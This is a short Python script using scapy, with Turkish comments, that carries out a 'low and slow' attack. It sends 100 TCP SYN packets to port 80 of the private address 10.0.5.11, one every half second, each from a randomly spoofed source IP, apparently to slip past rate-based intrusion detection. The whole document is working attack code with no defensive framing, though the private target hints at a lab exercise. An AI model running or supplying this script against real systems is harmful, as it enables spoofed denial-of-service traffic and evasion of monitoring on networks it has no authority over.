# slow_attack.py
from scapy.all import *
import time

target_ip = "10.0.5.11"
print(f"Low and Slow saldirisi baslatiliyor: {target_ip}")

for _ in range(100):
    # Her 0.5 saniyede bir, farklı bir IP'den sadece 1 paket
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=RandIP(), dst=target_ip) / TCP(dport=80, flags="S")
    sendp(pkt, verbose=0)
    time.sleep(0.5) 

print("Sinsi saldiri sona erdi.")